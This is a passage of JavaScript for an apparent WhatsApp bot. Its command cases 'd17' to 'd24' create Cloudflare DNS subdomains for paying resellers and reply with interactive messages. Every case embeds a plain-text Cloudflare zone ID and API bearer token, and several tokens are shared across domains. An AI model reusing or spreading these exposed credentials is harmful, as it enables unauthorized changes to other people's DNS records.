                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd17': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "5ac16dadc6a80d53657786f70c509a92";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "panellofficial.site";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd18': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f2bc5ee0d4471aa74dd689c297c7aa43";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "panellofficial.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd19': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "57671edad3d50d309860d91d25385e05";
               let apitoken = "5rBaTXV30xYNXTVbeB6okU6-61R04HN1lkZNxghp-dpwXqvg_n9HWq_jV4fzL";
               let tld = "celiapanellstore.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd20': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "034a5ceff63666337614606715f16e36";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "rullz.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd21': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
                              let zone = "58e007d228006517fbdd3687ddskf0e774";
               let apitoken = "6iiDSe0I9pCzEgjIP4jcFwfGWvyE0sjjWN_S_nIia09";
               let tld = "panelxdzz.tech";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd22': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
let zone = "8314daaaeea010f4b409sn1db178809b2d";
      let apitoken = "cVxrIBhtXiI9SJu2FiTJsLyG1juud4GdnkGd1DiOYLf";
      let tld = "panelzerone.xyz";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd23': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a1fa0ffcde9549bd36e9ae3de4b66b4a";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panell.icu";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
                messageId: msgii.key.id
            });
        } else {
            reply(`Gagal membuat subdomain\nMsg: ${e.error}`);
        }
    });
}
 break         
 case 'd24': {
    if (!isCreator&&!isPrem) return reply('𝗞𝗵𝘂𝘀𝘂𝘀 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗦𝘂𝗯𝗱𝗼𝗺𝗮𝗶𝗻 𝗞𝗮𝗹𝗼 𝗠𝗮𝘂 𝗕𝘂𝘆 𝗞𝗲 wa.me/6283167532721')
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "a112599ddfdd5a2bac5dc91864020015";
               let apitoken = "KGhjPqE6foR70mzTnrd4X1DSopNBVtMJJSudc6wi";
               let tld = "panellstoree.com";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("ᴘᴇɴɢɢᴜɴᴀᴀɴ .d1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("ʜᴏꜱᴛ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ, ᴘᴀꜱᴛɪᴋᴀɴ ʜᴏꜱᴛ ʜᴀɴʏᴀ ᴍᴇɴɢᴀɴᴅᴜɴɢ ʜᴜʀᴜꜰ, ᴀɴɢᴋᴀ, - (ꜱᴛʀɪᴘ), ᴅᴀɴ . (ᴛɪᴛɪᴋ)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ɪᴘᴠᴘꜱ ᴛɪᴅᴀᴋ ᴠᴀʟɪᴅ" : "ᴍᴀɴᴀ ɪᴘᴠᴘꜱ ɴʏᴀ?");
   
           subDomain1(host1, ip1).then(async (e) => {
        if (e.success) {
            let msgii = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: { 
                                mentionedJid: [m.sender] 
                            },
                            body: proto.Message.InteractiveMessage.Body.create({ 
                                text: `*ꜱᴜᴄᴄᴇꜱ ᴍᴇᴍʙᴜᴀᴛ ꜱᴜʙᴅᴏᴍᴀɪɴ*\n_Ip : ${e.ip}_\n_Hostname : ${e.name}_\n\n*_ꜱᴜʙᴅᴏᴍᴀɪɴ ʙʏ lynnzxd⚡_*`
                            }), 
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                                buttons: [
                                    {
                                        name: "cta_copy",
                                        buttonParamsJson: `{"display_text":" Copy Code","id":"123456789","copy_code":"${e.name}"}`
                                    }
                                ]
                            })
                        })
                    }
                }
            }, { userJid: m.sender, quoted: m });

            await slime.relayMessage(msgii.key.remoteJid, msgii.message, {
